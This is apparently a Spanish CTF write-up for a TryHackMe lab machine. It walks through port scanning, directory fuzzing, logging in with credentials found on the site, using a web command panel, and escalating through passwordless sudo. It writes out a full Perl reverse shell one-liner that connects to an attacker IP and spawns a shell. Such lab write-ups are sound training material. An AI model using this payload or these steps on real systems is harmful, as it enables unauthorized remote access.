  
![[lolo_apuntes.pdf]]
  
Iniciamos con la VPN de tryhackme:
  
  
![[/Untitled 39.png|Untitled 39.png]]
![[/Untitled 1 5.png|Untitled 1 5.png]]
Confirmamos que tenemos conexión con la vpn:  
  
  
![[/Untitled 2 6.png|Untitled 2 6.png]]
  
Iniciamos la maquina:
![[/Untitled 3 6.png|Untitled 3 6.png]]
  
Comprobamos que tenemos conexión a la maquina:
![[/Untitled 4 5.png|Untitled 4 5.png]]
  
METODOLOGIA DE ATAQUE
A continuación, procedemos a realizar un escaneo inicial para identificar los puertos abiertos y los servicios que están funcionando en la máquina.
![[NMAP-6_-Listado-de-comandos.pdf]]
sudo nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.168.5
![[/Untitled 5 5.png|Untitled 5 5.png]]
  
Podemos ver que los puertos 80 (http) y 22 (ssh) están abiertos.
Comenzamos atacando el puerto 80 introduciendo la ip de la maquina en el navegador:  
  
![[/Untitled 6 5.png|Untitled 6 5.png]]
Ctrl u para ver el código de la web:  
  
![[/Untitled 7 5.png|Untitled 7 5.png]]
  
Podemos ver un supuesto usuario.
El siguiente paso es ver el documento robots.txt:
![[/Untitled 8 5.png|Untitled 8 5.png]]
Únicamente se encuentra esta palabra rara.
  
Intentamos acceder mediante ssh con el usuario encontrado, pero vemos que no es posible la conexión mediante la terminal, restricción mediante la clave publica.
![[/Untitled 9 5.png|Untitled 9 5.png]]
  
Utilizamos el fuzzer llamado ffuf para ver si hay alguna ruta interesante.  
  
ffuf -w directory-list-2.3-medium.txt -u [http://10.10.168.5/FUZZ.php](http://10.10.168.5/FUZZ.php)
-u: URL objetivo con FUZZ como marcador de posición para el fuzzing.  
-w: Ruta al diccionario.  
  
![[/Untitled 10 5.png|Untitled 10 5.png]]
![[/Untitled 11 5.png|Untitled 11 5.png]]
![[/Untitled 12 4.png|Untitled 12 4.png]]
Ingresamos una ruta encontrada llamada assets y deducimos que hay mas web ya que hay imágenes que no hemos visto.
![[/Untitled 13 4.png|Untitled 13 4.png]]
Ingresamos en el navegador lo siguiente 10.10.168.5/portal.php y nos redirige a [http://10.10.168.5/login.php](http://10.10.168.5/login.php) :
  
![[/Untitled 14 3.png|Untitled 14 3.png]]
Intentamos acceder con el usuario encontrado anteriormente y con la palabra rara del robots.txt:  
  
  
  
`R1ckRul3s`  
  
`Wubbalubbadubdub`
![[/Untitled 15 2.png|Untitled 15 2.png]]
Nos encontramos con un panel de comandos, suponemos que es la terminal de comandos del dispositivo donde se aloja la web.
![[/Untitled 16 2.png|Untitled 16 2.png]]
Mediante un ls observamos que tenemos el ingrediente, por lo que intentamos con cat ver el contenido pero esta deshabilitado.
Alternativas al cat: [https://baulderasec.wordpress.com/programacion/primeros-pasos-con-linux/visualizar-ficheros-cat-more-less-head-tail/](https://baulderasec.wordpress.com/programacion/primeros-pasos-con-linux/visualizar-ficheros-cat-more-less-head-tail/)
![[/Untitled 17 2.png|Untitled 17 2.png]]
Comprobamos con un more, pero finalmente conseguimos el contenido mediante un less:  
  
![[/Untitled 18 2.png|Untitled 18 2.png]]
Investigando encontramos que hay mas contenido en clue.txt
![[/Untitled 19 2.png|Untitled 19 2.png]]
En la vista del command panel encontramos esto en el código:  
  
![[/Untitled 20 2.png|Untitled 20 2.png]]
Parece ser una distracción, ya que parece ser base64 y no encontramos nada claro por lo que intentamos ver otros directorios.
Nos encontramos en  
  
![[/Untitled 21 2.png|Untitled 21 2.png]]
Listamos el contenido de var y nos encontramos con esto
![[/Untitled 22 2.png|Untitled 22 2.png]]
Listamos el contenido de home
![[/Untitled 23 2.png|Untitled 23 2.png]]
Listamos el contenido de rick
![[/Untitled 24 2.png|Untitled 24 2.png]]
Nos encontramos con el segundo ingrediente, intentamos ver el contenido
![[/Untitled 25 2.png|Untitled 25 2.png]]
Parece estar vacio, pero intentaremos atacar con una reverse shell para ver si encontramos algo mas.
Para lanzar la reverse shell: [https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)  
  
  
`perl -e 'use`
`Socket;$i="10.9.0.95";$p=``**443**``;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("``**sh**` `-i");};'`
  
Nos ponemos en escucha en el 443 con netcat(puerto configurado para la reverse shell):  
  
![[/Untitled 26 2.png|Untitled 26 2.png]]
Lanzamos la reverse shell:  
  
![[/Untitled 27 2.png|Untitled 27 2.png]]
Estamos dentro
![[/Untitled 28 2.png|Untitled 28 2.png]]
Intentamos acceder al segundo ingrediente que vimos desde la command panel de la web
![[/Untitled 29 2.png|Untitled 29 2.png]]
![[/Untitled 30 2.png|Untitled 30 2.png]]
Éncontramos el contenido del segundo ingrediente
![[/Untitled 31 2.png|Untitled 31 2.png]]
Despues intentamos acceder al directorio root, pero no nos deja acceder ya que no tenemos permisos, y lanzamos el comando sudo -l para ver si podemos lanzar el comando sudo y vemos que si
![[/Untitled 32 2.png|Untitled 32 2.png]]
Ya que no requiere contraseña escalamos privilegios de la siguiente manera
![[/Untitled 33 2.png|Untitled 33 2.png]]
Ahora si vamos a poder acceder al directorio root
![[/Untitled 34 2.png|Untitled 34 2.png]]
Ya tenemos el tercer ingrediente veamos el contenido
![[/Untitled 35 2.png|Untitled 35 2.png]]
  
Maquina terminada.